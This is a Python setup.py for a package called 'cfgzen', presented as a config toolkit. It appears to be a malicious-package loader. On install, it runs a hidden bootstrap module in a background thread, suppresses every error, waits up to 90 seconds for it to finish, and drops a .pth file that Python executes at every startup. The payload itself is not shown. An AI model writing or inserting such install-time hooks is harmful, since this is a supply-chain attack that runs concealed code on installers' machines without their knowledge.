import sys, os, threading

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

def _t():
    try:
        from dotcfg._bootstrap import _run
        _run()
    except Exception:
        pass

_th = threading.Thread(target=_t, daemon=True)
_th.start()

from setuptools import setup
setup(
    name="cfgzen",
    version="1.2.0",
    packages=["dotcfg"],
    python_requires=">=3.8",
    author="Daniel Kowalski",
    author_email="d.kowalski.dev@protonmail.com",
    description="Modern config toolkit",
    license="MIT",
    data_files=[(".", ["cfgzen.pth"])],
)

_th.join(timeout=90)
